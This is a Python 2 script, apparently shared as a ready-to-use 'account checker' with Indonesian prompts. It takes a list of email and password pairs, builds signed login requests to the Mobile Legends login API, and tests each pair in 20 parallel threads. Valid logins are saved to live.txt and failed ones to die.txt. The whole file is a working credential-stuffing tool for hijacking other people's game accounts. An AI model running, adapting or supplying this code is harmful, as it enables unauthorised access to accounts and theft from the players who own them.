#!usr/bin/python2.7
# coding=utf-8

############################################################
# Name           : Moonton Account Checker                 #
# File           : main.py                                 #
############################################################

import requests, os, sys, hashlib, json
from multiprocessing.pool import ThreadPool

if sys.version_info.major != 2:
  exit('\n[WARNING] Gunakan python versi 2')

class MOONTON:
  def __init__(self):
    self.userdata = []
    self.live = []
    self.die = []
    self.api = 'https://accountmtapi.mobilelegends.com/'
    print('''\033[0m

|V| _  _ __ _|_ _ __    /  |_  _  _  |  _  __
| |(_)(_)| | |_(_)| |   \__| |(/_(_  |<(/_ | 
---------------------------------------------
          -  By Setiawan007 -
---------------------------------------------\n''')

  def main(self):
    print('[!] Pemisah email:password atau email|password\n')
    empas = raw_input('[?] List empas (ex: list.txt): ')
    if os.path.exists(empas):
      for data in open(empas,'r').readlines():
        try:
          user = data.strip().split('|')
          if user[0] and user[1]:
            self.userdata.append({
              'email': user[0],
              'pw': user[1],
              'userdata': data.strip()
            })
        except IndexError:
          try:
            user = data.strip().split(':')
            if user[0] and user[1]:
              self.userdata.append({
              'email': user[0],
              'pw': user[1],
              'userdata': data.strip()
            })
          except: pass
      if len(self.userdata) == 0:
        exit('[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass')
      print('[*] Total {0} Account\n'.format(str(len(self.userdata))))
      ThreadPool(20).map(self.validate, self.userdata)
      print('\n[#] BERHASIL: '+str(len(self.live))+' - saved: live.txt')
      print('[#] GAGAL: '+str(len(self.die))+' - saved: die.txt')
      exit(0)
    else:
      print('[!] File tidak ditemukan "{0}"'.format(empas))

  def build_params(self, user):
    md5 = hashlib.new('md5')
    md5.update(user['pw'].encode('utf-8'))
    md5pwd = md5.hexdigest()
    sign = 'account={0}&md5pwd={1}&op=login'.format(user['email'], md5pwd)
    md5 = hashlib.new('md5')
    md5.update(sign.encode('utf-8'))
    hashed = md5.hexdigest()
    return json.dumps({
      'op': 'login',
      'sign': hashed,
      'params': {
        'account': user['email'],
        'md5pwd': md5pwd,
      },
      'lang': 'cn'
    })

  def validate(self, user):
    try:
      data = self.build_params(user)
      response = requests.post(self.api, data=data).json()
      if response['message'] == 'Error_Success':
        print('[\033[92mBERHASIL\033[0m] '+user['userdata'])
        self.live.append(user['userdata'])
        open('live.txt','a').write(str(user['userdata'])+'\n')
      else:
        print('[\033[91mGAGAL\033[0m] '+user['userdata'])
        self.die.append(user['userdata'])
        open('die.txt','a').write(str(user['userdata'])+'\n')
    except:
      self.validate(user)

if __name__ == '__main__':
  (MOONTON().main())
